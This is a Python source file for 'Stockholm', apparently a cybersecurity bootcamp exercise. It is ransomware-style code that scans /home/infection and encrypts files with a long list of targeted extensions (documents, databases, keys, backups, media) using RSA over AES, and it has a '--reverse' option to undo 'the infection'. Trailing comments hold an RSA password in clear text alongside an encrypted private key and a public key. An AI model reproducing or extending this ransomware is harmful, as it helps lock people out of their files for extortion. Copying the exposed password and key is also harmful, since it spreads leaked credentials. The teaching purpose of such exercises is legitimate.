import argparse, os, string
from krypt import alloc
from secrets import choice
from typing import Iterator

def arg_parser():
    try:
        argv_parser = argparse.ArgumentParser(
            prog="Stockholm",
            description='./stockholm A program to encrypt the contents of the files in a folder',
            epilog='Piscina Cyberseguridad - smagniny',
        )
        argv_parser.add_argument('-v', '--version', help='Shows the version of the program', action="store_true")
        argv_parser.add_argument('-r', '--reverse', help='Reverse the infection !', nargs='+')
        argv_parser.add_argument('-s', '--silent', help='The program will not produce any output', action="store_true")
        argv = argv_parser.parse_args()

        return argv.version, argv.reverse, argv.silent
    except Exception as E:
        print(str(E))

class Stockholm:
    '''
    Clase que representa el programa Stockholm, encargado de cifrar los archivos en una carpeta utilizando AES y RSA.
    permite generar llaves AES y RSA, exportarlas e importarlas, y cifrar los archivos en la carpeta especificada.
    '''
    version = "1.0.0"
    default_route ="/home/infection"
    default_extension = "ft"
    _target_extensions = (
        '.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw',
        '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif',
        '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm',
        '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb', '.db',
        '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo',
        '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1',
        '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp',
        '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv',
        '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2',
        '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef',
        '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd',
        '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk',
        '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx',
        '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks',
        '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost',
        '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx',
        '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx',
        '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc'
    )

    def __init__(self, version=False, reverse=False, silent=False):
        if version:
            argv_parser = argparse.ArgumentParser(
            prog="Stockholm",
            description='./stockholm A program to encrypt the contents of the files in a folder',
            epilog='Piscina Cyberseguridad - smagniny',
            )
            argv_parser.add_argument('-v', '--version', help='Shows the version of the program', action="store_true")
            argv_parser.add_argument('-r', '--reverse', help='Reverse the infection !', nargs='+')
            argv_parser.add_argument('-s', '--silent', help='The program will not produce any output', action="store_true")
            argv_parser.print_help()
        self.silent = silent
        self.reverse = reverse
        self.krypt = alloc()

    def get_extension(self, index=None):
        """
        Recupera las extensiones objetivo.
        
        Args:
            index (int, optional): Índice específico. Si es None, devuelve todas.
        
        Returns:
            tuple o str: Tupla completa de extensiones o una extensión específica.
        
        Raises:
            IndexError: Si el índice está fuera de rango.
        """
        if index is None:
            return self._target_extensions
        return self._target_extensions[index]

    def scanndir(self, path:str) -> Iterator[os.DirEntry]:
        with os.scandir(path) as lst:
            for archivo in lst:
                yield archivo

    def stockholm(self):
        list_files = os.scandir(self.default_route)
        for file in list_files:
            if file.name.endswith(self.get_extension()):
                self.krypt.encrypt_data_RSA_OVER_AES(self.default_route, file.name, not self.silent)

    def paris(self, reverse_path=None, password=None):
        list_files = os.scandir(self.default_route)
        for file in list_files:
            if file.name.endswith(".ft"):
                try:
                    self.krypt.decrypt_data_RSA_OVER_AES(self.default_route, file.name, reverse_path, password, not self.silent)
                except Exception as E:
                    print(E)

if __name__ == "__main__":
    version, reverse, silent = arg_parser()

    goodware = Stockholm(version, reverse, silent)

    n_args = len(goodware.reverse) if goodware.reverse else 0
    if n_args:
        if n_args==2:
            print("Reverse with RSA Private key on PATH: ", reverse[0])
            print("Password used for RSA: ", reverse[1])
            goodware.paris(reverse[0], reverse[1])
        else:
            goodware.paris(reverse[0])
    elif version:
        print("===============VERSION===============")
        print("v", goodware.version)
        print("=====================================")
    else:
        goodware.krypt.generar_llaves_rsa()
        #goodware.krypt.save_session("session.enc", "m4st3rpassw0rd")
        goodware.stockholm()

# Used password RSA:
#         nIccrgXjLNyOYqCUgfEsIaUQoJhuzcUt

#         Llave generada en '/home/KEY_Stockholm_KEY.pem'.

# =================================================================

# b'-----BEGIN ENCRYPTED PRIVATE KEY-----\n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\n-----END ENCRYPTED PRIVATE KEY-----'

# =================================================================

#         Llave pública exportada en '/home/PUBLIC_KEY_Stockholm_PUBLIC_KEY.pem'.

# =================================================================

# b'-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAlQmPVc4XaUM7tHsxDIAt\ntK+Aa4UgooJvj0zXXq/PvCJLoF4Q0yf0rAL7SEp/FkNNJAdHurZwIxADHSZ/FrLB\nYeMiU7FivPfMN1ghbQKNy8vwDpCPy6q/phwptF2IioXR2XG23GoH6uqZX7oyA5HP\nfdCKr0TtBnHvQzDe69DxBks8QsQ6TOeapLQai7sjSJ2XFMGQqUOnX3eaplGttJh/\neMzYtNNDWkcQpWwsrdBIUVUFWojNdqF0qtKGXVf7eoazA6kS+OSR6JYfzifEFUsi\n7Y8cA2DbtiHaJdrwavpzRFdE3jvbNDhqMMS9zgF+K9CvfcAUgg8kUzjMuI4zUHhw\nfnO0E/hMUrprg9f8P8nsQuGfHmnfqn6j4DEHuPduGNJlrvlyiKbfW9vy6tTx5AJ8\nPozhpdg3r4VTgVlncNW0+rMcW+GqhG/YHUufnN4qysVhNvvbtA9lBv33fMCwNt9Q\ndZEbP9fzCtkSzzQHItEGvPeljyD2+QpjenBkXAA/T9EO298mJ45Ock0mNveTZb6h\nNKuJ58hMUVWu57dsMiqTOPm53a0yjYGX4KK/P17p/bKMmQ8UK6yK9ES0K/1aeWY9\n2b1Ev3FMsb1wEqeZ64AfDdrROZmkk08KfEFqJu2v7nDO3GroZdjrUINQdNGwacmv\nuP1Sa7WAX11DKDkACGvdJLUCAwEAAQ==\n-----END PUBLIC KEY-----'

# =================================================================